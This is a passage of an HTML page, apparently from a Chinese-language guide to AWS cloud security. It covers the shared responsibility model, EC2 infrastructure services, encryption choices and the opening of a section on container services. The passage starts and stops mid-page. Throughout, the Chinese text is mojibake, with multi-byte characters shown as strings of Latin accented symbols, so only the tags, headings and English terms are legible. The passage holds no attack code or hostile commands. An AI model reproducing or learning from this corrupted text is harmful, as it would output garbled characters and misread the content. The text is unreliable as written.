ä¸Šäº†</td></tr></tbody></table><p>é‚£ä¹ˆï¼Œåœ¨å…¬æœ‰äº‘ä¸Šè¿è¡Œåº”ç”¨æ˜¯å¦çœŸçš„å®‰å…¨ï¼Ÿåœ¨æ¢è®¨è¿™ä¸€é—®é¢˜ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦èšç„¦äºä¸€ä¸ªå…·ä½“çš„å…¬æœ‰äº‘å¹³å°ï¼Œä»¥é¿å…è®¤çŸ¥è´Ÿæ‹…ã€‚ä»¥å…¨çƒå¸‚åœºä»½é¢é¢†å…ˆçš„å…¬æœ‰äº‘å¹³å° AWS ä¸ºä¾‹ï¼šAWS çš„å®‰å…¨æ€§æ—¢ä¸å¤æ‚ä¹Ÿä¸ç®€å•ï¼Œå…³é”®åœ¨äºæˆ‘ä»¬å¦‚ä½•ä½¿ç”¨å®ƒã€‚åœ¨è´£ä»»å…±æ‹…æ¨¡å‹ä¸‹ï¼Œå®‰å…¨æ˜¯äº‘æœåŠ¡æä¾›å•†ä¸ç”¨æˆ·åŒæ–¹çš„å…±åŒè´£ä»»ã€‚</p><p>æˆ‘ä»¬ä¸ä¼šç®€å•åœ°å›ç­”â€œåº”ç”¨ä¸Šäº‘æ˜¯å¦å®‰å…¨â€è¿™ä¸ªé—®é¢˜ï¼Œè€Œæ˜¯é€‰æ‹©æ·±å…¥å­¦ä¹ ä¸€ä¸ªäº‘å¹³å°ï¼Œå¿«é€Ÿæ„å»ºå®Œæ•´çš„çŸ¥è¯†æ¡†æ¶ä¸å®æ“èƒ½åŠ›ï¼Œå†è¿›ä¸€æ­¥å®ç°çŸ¥è¯†è¿ç§»ä¸èä¼šè´¯é€šã€‚</p><h2 id="0x02-é€šç”¨çš„å…±æ‹…è´£ä»»æ¨¡å‹"><a href="#0x02-é€šç”¨çš„å…±æ‹…è´£ä»»æ¨¡å‹" class="headerlink" title="0x02 é€šç”¨çš„å…±æ‹…è´£ä»»æ¨¡å‹"></a>0x02 é€šç”¨çš„å…±æ‹…è´£ä»»æ¨¡å‹</h2><p>å­¦ä¹ äº‘å®‰å…¨çš„ç¬¬ä¸€æ­¥æ˜¯æ˜ç¡®äº‘ç¯å¢ƒä¸­å„æ–¹æ‰€éœ€æ‰¿æ‹…çš„å®‰å…¨è´£ä»»ã€‚å­˜å‚¨åœ¨äº‘ä¸­çš„æ•°æ®å’Œå·¥ä½œè´Ÿè½½çš„å®‰å…¨æ€§éœ€è¦ç”± <strong>å®¢æˆ·ï¼ˆCustomerï¼‰</strong> å’Œ <strong>äº‘æœåŠ¡æä¾›å•†ï¼ˆCloud Service Providerï¼‰</strong> å…±åŒåˆ†æ‹…ï¼Œä½†å„è‡ªè´Ÿè´£çš„èŒƒå›´æœ‰æ‰€ä¸åŒã€‚</p><p>é€šç”¨çš„ <strong>è´£ä»»å…±æ‹…æ¨¡å‹ï¼ˆShared Responsibility Modelï¼‰</strong> æ˜ç¡®äº†åŒæ–¹çš„è´£ä»»åˆ’åˆ†ã€‚è¯¥æ¨¡å‹å®šä¹‰äº†ä½œä¸ºå®¢æˆ·çš„æˆ‘ä»¬å’Œä½œä¸ºäº‘æœåŠ¡æä¾›å•†çš„ AWSï¼Œåœ¨å®æ–½ã€æ§åˆ¶å’Œç®¡ç†å®‰å…¨æ€§æ—¶å„è‡ªçš„èŒè´£èŒƒå›´ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸€æ¨¡å‹æœ¬èº«å¹¶ä¸å…·å¤‡æ³•å¾‹æ•ˆåŠ›ï¼Œä½†äº†è§£å…¶å†…å®¹å¹¶è®¤è¯†åˆ°å…¶é‡è¦æ€§ï¼Œå¯¹äºæœ‰æ•ˆæ„å»ºå’Œä¿æŠ¤äº‘èµ„æºè‡³å…³é‡è¦ã€‚</p><p><a href="https://aws.amazon.com/cn/blogs/industries/applying-the-aws-shared-responsibility-model-to-your-gxp-solution/" title="AWS æä¾›äº†ä¸‰ç§ä¸åŒçš„è´£ä»»å…±æ‹…æ¨¡å‹">AWS æä¾›äº†ä¸‰ç§ä¸åŒçš„è´£ä»»å…±æ‹…æ¨¡å‹</a>ï¼Œåˆ†åˆ«é€‚ç”¨äº<strong>åŸºç¡€è®¾æ–½ï¼ˆInfrastructureï¼‰</strong> ã€<strong>å®¹å™¨ï¼ˆContainerï¼‰</strong> å’Œ <strong>æ‰˜ç®¡ï¼ˆManagedï¼‰</strong> æœåŠ¡ã€‚åœ¨è¿™ä¸‰ç§æ¨¡å‹ä¸­ï¼Œå®¢æˆ·ä¸äº‘æœåŠ¡æä¾›å•†åˆ†æ‹…çš„å®‰å…¨è´£ä»»å„ä¸ç›¸åŒã€‚</p><p>å…·ä½“è€Œè¨€ï¼Œå®¢æˆ·å’Œäº‘æœåŠ¡æä¾›å•†æ‰€éœ€æ‰¿æ‹…çš„å®‰å…¨è´£ä»»å–å†³äºæ‰€ä½¿ç”¨æˆ–æä¾›çš„æœåŠ¡ç±»å‹ã€‚æœåŠ¡çš„å¯å®šåˆ¶æ€§è¶Šé«˜ï¼Œå®¢æˆ·æ‰€éœ€æ‰¿æ‹…çš„å®‰å…¨è´£ä»»å°±è¶Šå¤§ã€‚æ¢å¥è¯è¯´ï¼Œå®¢æˆ·çš„å®‰å…¨è´£ä»»ä¸å…¶åœ¨æœåŠ¡é…ç½®ä¸­éœ€è¦æ‰§è¡Œçš„æ“ä½œæ•°é‡ç›´æ¥ç›¸å…³ã€‚</p><p>å¦‚å›¾ 1-3 æ‰€ç¤ºï¼Œåœ¨ä»¥ IaaS å½¢å¼æä¾›çš„åŸºç¡€è®¾æ–½æœåŠ¡ï¼ˆå¦‚ EC2ï¼‰ä¸­ï¼Œå®¢æˆ·éœ€æ‰¿æ‹…æ›´å¤šçš„å®‰å…¨è´£ä»»ã€‚è¿™ç§æ›´å¤§çš„è´£ä»»ä¹Ÿå¸¦æ¥äº†æ›´é«˜çš„çµæ´»æ€§å’Œè‡ªå®šä¹‰èƒ½åŠ›ã€‚</p><p><img src="/image/image_U1T-MMMjnL.png" alt="å›¾ 1-3ï¼šå…±æ‹…è´£ä»»æ¨¡å‹æ¯”è¾ƒ" title="å›¾ 1-3ï¼šå…±æ‹…è´£ä»»æ¨¡å‹æ¯”è¾ƒ"></p><p>å›¾ 1-3 æ€»ç»“äº†åŸºç¡€è®¾æ–½æœåŠ¡ã€å®¹å™¨æœåŠ¡å’Œæ‰˜ç®¡æœåŠ¡ä¸‰ç§æ¨¡å‹ä¸­ï¼Œå®¢æˆ·ä¸ AWS å„è‡ªéœ€è¦æ‰¿æ‹…çš„å®‰å…¨è´£ä»»ã€‚</p><p>åœ¨è¿™ä¸‰ç§æ¨¡å‹ä¸­ï¼ŒAWS å§‹ç»ˆéœ€è¦æ‰¿æ‹…ä»¥ä¸‹å®‰å…¨è´£ä»»ï¼š<strong>ç¡¬ä»¶</strong>ã€<strong>AWS å…¨çƒåŸºç¡€è®¾æ–½</strong>ä»¥åŠ<strong>AWS åŸºç¡€æœåŠ¡</strong>ã€‚</p><ul><li><strong>ç¡¬ä»¶ï¼ˆHardwareï¼‰</strong>ï¼šæŒ‡æ„æˆäº‘æœåŠ¡çš„ç‰©ç†è®¾å¤‡ï¼ŒåŒ…æ‹¬ç‰©ç†æœåŠ¡å™¨ã€ç½‘ç»œè®¾å¤‡ã€ç£ç›˜é˜µåˆ—ã€æœºæ¶ã€ç”µæºåŠåˆ¶å†·ç³»ç»Ÿç­‰ã€‚ä½œä¸ºäº‘è®¡ç®—èµ„æºçš„åº•å±‚åŸºç¡€ï¼Œè¿™äº›ç¡¬ä»¶ç”± AWS è´Ÿè´£é‡‡è´­ä¸ç»´æŠ¤ã€‚</li><li><strong>AWS å…¨çƒåŸºç¡€è®¾æ–½ï¼ˆAWS Global Infrastructureï¼‰</strong>ï¼šæŒ‡ AWS åœ¨å…¨çƒèŒƒå›´å†…çš„ç‰©ç†ä¸é€»è¾‘èµ„æºå¸ƒå±€æ¶æ„ï¼Œæ¶µç›–<strong>åŒºåŸŸï¼ˆRegionï¼‰</strong>ã€<strong>å¯ç”¨åŒºï¼ˆAvailability Zoneï¼‰<strong>åŠ</strong>è¾¹ç¼˜ä½ç½®ï¼ˆEdge Locationï¼‰</strong>ã€‚å®ƒæ„æˆäº† AWS ç”¨äºå­˜å‚¨èµ„æºå’Œæä¾›æ¥å…¥ç‚¹çš„æ•°æ®ä¸­å¿ƒç½‘ç»œï¼ŒåŒ…å«å¤§é‡ç‰©ç†ç¡¬ä»¶èµ„æºã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒAWS å…¨çƒåŸºç¡€è®¾æ–½ä¸ä»…æ¶‰åŠç¡¬ä»¶ï¼Œè¿˜å¼ºè°ƒåœ°ç†åˆ†å¸ƒä¸æ¶æ„è®¾è®¡ã€‚</li><li><strong>AWS åŸºç¡€æœåŠ¡ï¼ˆAWS Foundation Servicesï¼‰</strong>ï¼šåŒ…æ‹¬<strong>è®¡ç®—ï¼ˆComputeï¼‰</strong>ã€<strong>å­˜å‚¨ï¼ˆStorageï¼‰</strong>ã€<strong>æ•°æ®åº“ï¼ˆDatabaseï¼‰<strong>å’Œ</strong>ç½‘ç»œï¼ˆNetworkï¼‰</strong>ã€‚è¿™äº›æœåŠ¡æ˜¯ AWS ä¸Šè¿è¡Œåº”ç”¨æˆ–éƒ¨ç½²æ¶æ„çš„æŠ€æœ¯åŸºçŸ³ï¼Œä¾èµ–äº AWS çš„ç¡¬ä»¶ä¸å…¨çƒåŸºç¡€è®¾æ–½ï¼Œä¸ºç”¨æˆ·æä¾›æŒ‰éœ€åˆ›å»ºå’Œç®¡ç†èµ„æºçš„èƒ½åŠ›ã€‚ä¸å…¨çƒåŸºç¡€è®¾æ–½ä¾§é‡åœ°ç†åˆ†å¸ƒä¸åŒï¼ŒAWS åŸºç¡€æœåŠ¡æ›´å…³æ³¨åœ¨è¿™äº›åŸºç¡€è®¾æ–½ä¸Šè¿è¡Œçš„æ ¸å¿ƒèµ„æºæœåŠ¡èƒ½åŠ›ï¼Œå¹¶ä¸ºå…¶ä»– AWS æœåŠ¡ï¼ˆå¦‚ AIã€å¤§æ•°æ®åŠå®‰å…¨å·¥å…·ç­‰ï¼‰æä¾›æ”¯æŒã€‚</li></ul><p>ä½œä¸ºå®¢æˆ·ï¼Œæˆ‘ä»¬æ— æ³•ç‰©ç†è®¿é—® AWS æ•°æ®ä¸­å¿ƒå¹¶æŸ¥çœ‹å…¶è¿è¡Œçš„äº‘èµ„æºï¼Œä¹Ÿæ— æ³•ç›´æ¥è®¿é—® AWS çš„ç‰©ç†ä¸»æœºåŠå…¶åº•å±‚è™šæ‹Ÿæœºç®¡ç†ç¨‹åºè½¯ä»¶ã€‚</p><p>ä½œä¸ºäº‘æœåŠ¡æä¾›å•†ï¼ŒAWS æœ‰è´£ä»»ç¡®ä¿å…¶æ•°æ®ä¸­å¿ƒç¬¦åˆä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶å’Œå…¨çƒå®‰å…¨æ ‡å‡†ï¼ŒåŒæ—¶ä¿éšœç‰©ç†ä¸»æœºä¸Šçš„èµ„æºéš”ç¦»æ€§ï¼Œç¡®ä¿æ‰€æœ‰è®¿é—®å‡å¤„äºå—æ§çŠ¶æ€ã€‚</p><h2 id="0x03-åŸºç¡€è®¾æ–½æœåŠ¡"><a href="#0x03-åŸºç¡€è®¾æ–½æœåŠ¡" class="headerlink" title="0x03 åŸºç¡€è®¾æ–½æœåŠ¡"></a>0x03 åŸºç¡€è®¾æ–½æœåŠ¡</h2><h3 id="3-1-è´£ä»»å…±æ‹…æ¨¡å‹"><a href="#3-1-è´£ä»»å…±æ‹…æ¨¡å‹" class="headerlink" title="3.1 è´£ä»»å…±æ‹…æ¨¡å‹"></a>3.1 è´£ä»»å…±æ‹…æ¨¡å‹</h3><p>AWS é€šè¿‡å…¶éå¸ƒå…¨çƒçš„æ•°æ®ä¸­å¿ƒï¼Œæä¾›åº•å±‚ç¡¬ä»¶å’ŒåŸºç¡€è®¾æ–½ï¼Œä½¿å®¢æˆ·èƒ½å¤Ÿåˆ©ç”¨æ± åŒ–çš„ç¡¬ä»¶èµ„æºåˆ›å»ºäº‘èµ„æºã€‚æœ¬è´¨ä¸Šï¼Œå®¢æˆ·åœ¨å…¨çƒåŸºç¡€è®¾æ–½ä¸­ä½¿ç”¨ AWS åŸºç¡€æœåŠ¡æ—¶ï¼Œéœ€å¯¹å…¶æ‰€æœ‰æ“ä½œæ‰¿æ‹…æœ€ç»ˆçš„å®‰å…¨è´£ä»»ã€‚</p><p>å¦‚å›¾ 1-4 æ‰€ç¤ºï¼ŒåŸºç¡€è®¾æ–½æœåŠ¡çš„è´£ä»»å…±æ‹…æ¨¡å‹æ˜¯æœ€ä¸ºäººä»¬ç†ŸçŸ¥çš„æ¨¡å‹ï¼Œä¸»è¦æ¶µç›–è¯¸å¦‚ <strong>äºšé©¬é€Šå¼¹æ€§è®¡ç®—äº‘ï¼ˆAmazon Elastic Compute Cloudï¼Œç®€ç§° EC2ï¼‰</strong> ç­‰ IaaS æœåŠ¡ã€‚</p><p><img src="/image/image_6Mfh0aB2uv.png" alt="å›¾ 1-4ï¼šåŸºç¡€è®¾æ–½æœåŠ¡è´£ä»»å…±æ‹…æ¨¡å‹" title="å›¾1-4ï¼šåŸºç¡€è®¾æ–½æœåŠ¡è´£ä»»å…±æ‹…æ¨¡å‹"></p><p>EC2ï¼Œä¹Ÿå°±æ˜¯å¤§å®¶å¸¸è¯´çš„ AWS è™šæ‹Ÿæœºã€‚ä»¥ EC2 ä¸ºä¾‹ï¼Œå®¢æˆ·éœ€è¦æ‰¿æ‹…çš„å®‰å…¨è´£ä»»åŒ…æ‹¬ä»¥ä¸‹æ–¹é¢ï¼š</p><ul><li><strong>å®¢æˆ·æ•°æ®ï¼ˆCustomer Dataï¼‰</strong>ï¼šå®¢æˆ·éœ€å¯¹åœ¨ AWS ç¯å¢ƒä¸­å¯¼å…¥æˆ–åˆ›å»ºçš„æ•°æ®å®‰å…¨è´Ÿè´£ï¼Œä¾‹å¦‚å­˜å‚¨åœ¨ EC2 å·ä¸­çš„æ‰€æœ‰æ•°æ®ï¼Œæ— è®ºæ˜¯ä¸´æ—¶æ•°æ®è¿˜æ˜¯æŒä¹…åŒ–æ•°æ®ã€‚</li><li><strong>å¹³å°ã€åº”ç”¨åŠèº«ä»½ä¸è®¿é—®ç®¡ç†ï¼ˆPlatform, Application, and IAMï¼‰</strong>ï¼šå½“å®¢æˆ·åœ¨ EC2 å®ä¾‹ä¸Šéƒ¨ç½²åº”ç”¨æˆ–å¹³å°æ—¶ï¼Œéœ€è‡ªè¡Œé…ç½®ç›¸å…³æ§åˆ¶æªæ–½ï¼Œå¹¶å¯¹ EC2 å®ä¾‹åŠå…¶åº”ç”¨çš„è®¿é—®æ§åˆ¶è´Ÿå…¨è´£ã€‚AWS æä¾›äº† <strong>èº«ä»½ä¸è®¿é—®ç®¡ç†ï¼ˆIdentity and Access Managementï¼Œç®€ç§° IAMï¼‰</strong> æœåŠ¡æ¥æ”¯æŒè¿™äº›æ§åˆ¶æªæ–½ï¼Œä½†å…¶æ˜¯å¦è¢«æœ‰æ•ˆä½¿ç”¨ä»¥ç¡®ä¿å®‰å…¨æ€§ï¼Œåˆ™å®Œå…¨å–å†³äºå®¢æˆ·è‡ªèº«ã€‚</li><li><strong>æ“ä½œç³»ç»Ÿã€ç½‘ç»œåŠé˜²ç«å¢™é…ç½®ï¼ˆOperating System, Network and Firewall Configurationï¼‰</strong>ï¼šå¦‚å›¾ 1-2 æ‰€ç¤ºï¼ŒAWS çš„è´£ä»»èŒƒå›´ä»…åˆ°<strong>è½¯ä»¶ï¼ˆSoftwareï¼‰</strong>ï¼Œä¸€èˆ¬æŒ‡çš„æ˜¯ <strong>è™šæ‹ŸåŒ–ç®¡ç†ç¨‹åºï¼ˆHypervisorï¼‰</strong> ä¸ºæ­¢ã€‚ç”±äº EC2 å®ä¾‹å±äºåŸºç¡€è®¾æ–½æœåŠ¡ï¼Œç»´æŠ¤æ“ä½œç³»ç»Ÿçš„å®‰å…¨æ€§æ˜¯å®¢æˆ·çš„è´£ä»»ï¼ŒåŒ…æ‹¬æ“ä½œç³»ç»Ÿçš„è¡¥ä¸æ›´æ–°å’Œä¿®å¤ã€‚æ­¤å¤–ï¼ŒEC2 å®ä¾‹é€šå¸¸éƒ¨ç½²åœ¨ <strong>è™šæ‹Ÿç§æœ‰äº‘ï¼ˆVirtual Private Cloudï¼Œç®€ç§° VPCï¼‰</strong> ä¸­ï¼Œå› æ­¤å®¢æˆ·éœ€è¦è‡ªè¡Œé…ç½®å¹¶å…³è”ç½‘ç»œè®¾ç½®å’Œé˜²ç«å¢™è§„åˆ™ï¼ˆå¦‚å®‰å…¨ç»„ï¼‰ï¼Œä»¥ä¿éšœ EC2 å®ä¾‹ç¾¤çš„å®‰å…¨ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå®‰å…¨ç»„å®é™…ä¸Šæ˜¯ä¸€ç§ä½œç”¨äºå®ä¾‹çº§åˆ«çš„è™šæ‹Ÿé˜²ç«å¢™ã€‚</li><li><strong>å®¢æˆ·ç«¯æ•°æ®åŠ å¯†ä¸æ•°æ®å®Œæ•´æ€§è®¤è¯ï¼ˆClient-Side Data Encryption and Data Integrity Authenticationï¼‰</strong>ï¼šæœ¬éƒ¨åˆ†é‡ç‚¹ä»‹ç»å¦‚ä½•é€šè¿‡åŠ å¯†æœºåˆ¶ä¿æŠ¤ç”± EC2 å®ä¾‹ç”Ÿæˆæˆ–å­˜å‚¨çš„æ•°æ®ã€‚è‹¥éœ€å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œå®¢æˆ·éœ€è‡ªè¡Œéƒ¨ç½²ç›¸å…³æœºåˆ¶ä»¥å®ç°ä¿æŠ¤ç›®æ ‡ã€‚ &#x20;</li><li><strong>æœåŠ¡ç«¯åŠ å¯†ï¼ˆServer-Side Encryptionï¼‰</strong>ï¼šè‹¥å®¢æˆ·å¸Œæœ›é€šè¿‡æœåŠ¡ç«¯åŠ å¯†æ¥ä¿æŠ¤<strong>æ–‡ä»¶ç³»ç»Ÿï¼ˆFilesystemï¼‰<strong>å’Œ</strong>æ•°æ®ï¼ˆDataï¼‰</strong>ï¼Œåˆ™éœ€åˆ©ç”¨ <strong>å¯†é’¥ç®¡ç†æœåŠ¡ï¼ˆKey Management Serviceï¼Œç®€ç§° KMSï¼‰</strong> ç­‰å·¥å…·æ¥å®Œæˆæ•°æ®ä¿æŠ¤çš„å®æ–½ã€‚</li><li><strong>ç½‘ç»œæµé‡ä¿æŠ¤ï¼ˆNetwork Traffic Protectionï¼‰</strong>ï¼šåœ¨ EC2 å®ä¾‹ä¹‹é—´ä¼ è¾“ç½‘ç»œæµé‡æ—¶ï¼Œå®¢æˆ·åº”åœ¨é€‚å½“åœºæ™¯ä¸‹é…ç½® SSL æˆ– HTTPS ç­‰åè®®ä»¥åŠ å¯†é€šä¿¡ã€‚é€šè¿‡ <strong>AWS è¯ä¹¦ç®¡ç†ï¼ˆAWS Certificate Managerï¼‰</strong> æœåŠ¡ï¼Œå¯ç®€åŒ– AWS æœåŠ¡ä¸­å®‰å…¨è¯ä¹¦çš„ç®¡ç†ä¸é…ç½®ï¼Œä»è€Œç¡®ä¿é€šä¿¡è¿‡ç¨‹ä¸­çš„ <strong>åŠ å¯†ï¼ˆEncryptionï¼‰</strong> ã€ <strong>èº«ä»½éªŒè¯ï¼ˆAuthenticationï¼‰<strong>å’Œ</strong> å®Œæ•´æ€§æ ¡éªŒï¼ˆIntegrityï¼‰</strong> ã€‚æ›´å¤šè¯¦ç»†å†…å®¹å°†åœ¨ã€Šç¬¬ 19 ç«  è¯ä¹¦ä¸è¯ä¹¦æœåŠ¡ã€‹ä¸­æ·±å…¥æ¢è®¨ã€‚</li></ul><p>åœ¨è¿™é‡Œéœ€è¦è¡¥å……åŠ å¯†è´£ä»»æ¨¡å‹ä¸­æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯çš„åŒºåˆ«ï¼š</p><ul><li><strong>å®¢æˆ·ç«¯åŠ å¯†ï¼ˆClient-Side Encryptionï¼‰</strong>ï¼šç”¨æˆ·é€šè¿‡ OpenSSLã€AWS SDK ç­‰å·¥å…·ï¼Œåœ¨æœ¬åœ°å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†åï¼Œå†ä¸Šä¼ è‡³ S3 æˆ– WBS ç­‰ AWS æœåŠ¡ã€‚åŠ å¯†é€»è¾‘å’Œå¯†é’¥å®Œå…¨ç”±ç”¨æˆ·æŒæ§ï¼ŒAWS ä»…è´Ÿè´£å­˜å‚¨åŠ å¯†åçš„æ•°æ®ï¼Œæ— æ³•è·çŸ¥å…·ä½“å†…å®¹ã€‚</li><li><strong>æœåŠ¡ç«¯åŠ å¯†ï¼ˆServer-Side Encryptionï¼‰</strong>ï¼šç”¨æˆ·ä¸Šä¼ æœªåŠ å¯†çš„æ˜æ–‡æ•°æ®ï¼ŒAWS åœ¨æ¥æ”¶åäºæœåŠ¡ç«¯è‡ªåŠ¨å®ŒæˆåŠ å¯†æ“ä½œã€‚åŠ å¯†è¿‡ç¨‹å¯ä½¿ç”¨é»˜è®¤å¯†é’¥ï¼Œæˆ–ç”±ç”¨æˆ·é€šè¿‡ KMS ç®¡ç†çš„å¯†é’¥æ‰§è¡Œã€‚åŠ å¯†åŠ¨ä½œç”± AWS è´Ÿè´£å®æ–½ï¼Œä½†æœåŠ¡çš„å¯ç”¨ä¸é…ç½®ä»éœ€ç”¨æˆ·è‡ªè¡Œå®Œæˆã€‚</li></ul><h3 id="3-2-ç¤ºä¾‹"><a href="#3-2-ç¤ºä¾‹" class="headerlink" title="3.2 ç¤ºä¾‹"></a>3.2 ç¤ºä¾‹</h3><p>è‹¥è¦è‡ªè¡Œåˆ›å»ºè™šæ‹Ÿæœºï¼Œæˆ‘ä»¬éœ€è¦è®¢è´­ç‰©ç†æœåŠ¡å™¨ã€æœºæ¶å’Œå †å ç¡¬ä»¶ï¼Œå¹¶å°†å…¶å®‰è£…åˆ°æ•°æ®ä¸­å¿ƒçš„æœºæŸœä¸­ä»¥ç¡®ä¿å®‰å…¨ã€‚</p><p>ç„¶è€Œï¼Œåœ¨ AWS è´¦å·ä¸­åˆ›å»º EC2 å®ä¾‹æ—¶ï¼Œåªéœ€ä» AWS æä¾›çš„åœ°ç†åŒºåŸŸä¸­é€‰æ‹©ä¸€ä¸ªåŒºåŸŸæ¥éƒ¨ç½²å®ä¾‹å³å¯ã€‚</p><p>åˆ›å»º EC2 å®ä¾‹åï¼Œéœ€é…ç½® VPC ä»¥å®ç°åŸºæœ¬çš„ç½‘ç»œè¿æ¥ã€‚</p><p>ä¸€æ—¦ EC2 å®ä¾‹å¼€å§‹è¿è¡Œï¼Œæ— è®ºæ˜¯è¿è¡Œå‡ åˆ†é’Ÿã€å‡ å°æ—¶ã€å‡ ä¸ªæœˆè¿˜æ˜¯å‡ å¹´ï¼Œä½œä¸ºå®¢æˆ·ï¼Œæˆ‘ä»¬éƒ½éœ€è¦è´Ÿè´£æ›´æ–°æˆ–ç§»é™¤ä¸ç¬¦åˆå®‰å…¨åŸºçº¿çš„è½¯ä»¶åŒ…ã€‚</p><p>å¦‚æœæ·»åŠ å…¶ä»–ç”¨æˆ·ï¼Œåˆ™ä¼šæ¶‰åŠèº«ä»½ä¸è®¿é—®ç®¡ç†ï¼ˆIAMï¼‰çš„é—®é¢˜ã€‚æˆ‘ä»¬å¿…é¡»ç¡®ä¿è¿™äº›ç”¨æˆ·éµå¾ªç»„ç»‡çš„å¯†ç æˆ–å¯†é’¥ç­–ç•¥ã€‚</p><p>å¦‚æœæˆ‘ä»¬å®‰è£…äº†å…¶ä»–åº”ç”¨ï¼Œå¹¶ä¸”å‚å•†æˆ–å¼€å‘è€…æä¾›äº†å®‰å…¨è¡¥ä¸ï¼Œä¹Ÿéœ€è¦åŠæ—¶æ›´æ–°ã€‚</p><p>å½“éœ€è¦è¿æ¥è¯¥ EC2 å®ä¾‹æ—¶ï¼Œåˆ›å»ºé€šè¿‡ SSL æˆ– TLS å®ç°çš„å®‰å…¨è¿æ¥åŒæ ·æ˜¯æˆ‘ä»¬çš„è´£ä»»ã€‚ç¡®ä¿æ•°æ®åœ¨ç½‘ç»œä¼ è¾“è¿‡ç¨‹ä¸­çš„å®‰å…¨æ€§ï¼Œä¹Ÿå±äºè´£ä»»å…±æ‹…æ¨¡å‹ä¸­å®¢æˆ·åº”æ‰¿æ‹…çš„å®‰å…¨èŒè´£ã€‚</p><h3 id="3-3-æ€»ç»“"><a href="#3-3-æ€»ç»“" class="headerlink" title="3.3 æ€»ç»“"></a>3.3 æ€»ç»“</h3><p>æ€»çš„æ¥è¯´ï¼Œä½¿ç”¨ IaaS æ—¶ï¼ŒAWS è´Ÿè´£ä¿éšœäº‘å¹³å°è‡ªèº«çš„å®‰å…¨ï¼ŒåŒ…æ‹¬è™šæ‹ŸåŒ–ç®¡ç†ç¨‹åºåŠå…¶ä¸‹å±‚çš„å®‰å…¨ã€‚åŒæ—¶ï¼ŒAWS è¿˜éœ€ç¡®ä¿äº‘ä¸­æ‰˜ç®¡èµ„æºçš„å®‰å…¨ï¼Œè¿™ä¸€è´£ä»»ä»æ“ä½œç³»ç»Ÿå±‚å‘ä¸Šå»¶ä¼¸ï¼Œæ¶µç›–é…ç½®ã€åº”ç”¨ä»¥åŠæ•°æ®ç­‰æ–¹é¢ã€‚</p><p>å°½ç®¡åŸºç¡€è®¾æ–½æœåŠ¡åœ¨äº‘è®¡ç®—é¢†åŸŸå æ®é‡è¦åœ°ä½ï¼Œå°¤å…¶æ˜¯åœ¨ AWS å¹³å°ä¸Šè¡¨ç°çªå‡ºï¼Œä½†å®ƒä¸ PaaS æˆ– SaaS ç­‰æ‰“åŒ…å¼æœåŠ¡åœ¨å®‰å…¨è´£ä»»åˆ’åˆ†ä¸Šå­˜åœ¨æ˜¾è‘—å·®å¼‚ã€‚</p><h2 id="0x04-å®¹å™¨æœåŠ¡"><a href="#0x04-å®¹å™¨æœåŠ¡" class="headerlink" title="0x04 å®¹å™¨æœåŠ¡"></a>0x04 å®¹å™¨æœåŠ¡</h2><h3 id="4-1-è´£ä»»å…±æ‹…æ¨¡å‹"><a href="#4-1-è´£ä»»å…±æ‹…æ¨¡å‹" class="headerlink" title="4.1 è´£ä»»å…±æ‹…æ¨¡å‹"></a>4.1 è´£ä»»å…±æ‹…æ¨¡å‹</h3><p>æœ¬æ–‡å°†ä»‹ç»çš„ç¬¬äºŒä¸ªè´£ä»»å…±æ‹…æ¨¡å‹æ˜¯å®¹å™¨æœåŠ¡çš„è´£ä»»å…±æ‹…æ¨¡å‹ã€‚</p><p>å¦‚æœä½ å¯¹äº‘åŸç”Ÿå®‰å…¨æœ‰æ‰€äº†è§£ï¼Œé‚£ä¹ˆå¯¹â€œå®¹å™¨â€è¿™ä¸ªè¯ä¸€å®šä¸é™Œç”Ÿã€‚å®¹å™¨æ˜¯ä¸€ç§èƒ½å¤Ÿå°†åº”ç”¨åŠå…¶ä¾èµ–æ‰“åŒ…çš„æŠ€æœ¯ï¼Œå¸¸è§çš„å®ç°å·¥å…·æœ‰ Dockerã€Podman å’Œ Containerdã€‚AWS ä¹Ÿæä¾›äº†å¼¹æ€§å®¹å™¨æœåŠ¡ï¼Œå³ Amazon ECSï¼Œæˆ‘ä»¬å°†åœ¨ã€Šç¬¬ 2 ç«  åŸºæœ¬ AWS æœåŠ¡ã€‹ä¸­ä»‹ç»ã€‚</p><p>ç„¶è€Œï¼Œåœ¨è¿™é‡Œï¼Œâ€œå®¹å™¨æœåŠ¡â€ä¸»è¦æŒ‡è¿è¡Œåœ¨åŸºç¡€è®¾æ–½æœåŠ¡ä¹‹ä¸Šçš„æœåŠ¡ã€‚å¦‚æœå®¢æˆ·é€‰æ‹©ä½¿ç”¨å®¹å™¨æœåŠ¡ï¼Œåˆ™æ— æ³•è®¿é—®æŸäº›åŸºç¡€è®¾æ–½çº§åˆ«çš„ç»„ä»¶ï¼ˆå¦‚æ“ä½œç³»ç»Ÿï¼‰ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„å®¹å™¨æœåŠ¡åŠå¹³å°å³æœåŠ¡ï¼ˆPaaSï¼‰ç¤ºä¾‹ï¼š</p><ul><li><strong>AWS å¼¹æ€§å¤§æ•°æ®å¤„ç†æœåŠ¡ï¼ˆAWS Elastic MapReduceï¼Œç®€ç§° EMRï¼‰</strong>ï¼šæ”¯æŒ Apache Hadoop å’Œ Spark ç­‰å¤§æ•°æ®æ¡†æ¶çš„æœåŠ¡ã€‚</li><li><strong>AWS å…³ç³»å‹æ•°æ®åº“æœåŠ¡ï¼ˆAWS Relational Database Serviceï¼Œç®€ç§° RDSï¼‰</strong>ï¼šæä¾› MySQLã€PostgreSQL å’Œ Oracle ç­‰æ•°æ®åº“æœåŠ¡ã€‚</li><li><strong>AWS å¼¹æ€§åº”ç”¨éƒ¨ç½²å¹³å°ï¼ˆAWS Elastic Beanstalkï¼Œç®€ç§° EBï¼‰</strong>ï¼šä¸€ä¸ªç”¨äºå¿«é€Ÿéƒ¨ç½²å’Œç®¡ç† Web åº”ç”¨çš„ PaaS å¹³å°ï¼Œæ”¯æŒ Node.jsã€Python å’Œ Java ç­‰å¤šç§ç¼–ç¨‹è¯­è¨€ã€‚</li></ul><p><img src="/image/image_wcRIDjO-NX.png" alt="å›¾ 1-5ï¼šå®¹å™¨æœåŠ¡è´£ä»»å…±æ‹…æ¨¡å‹" 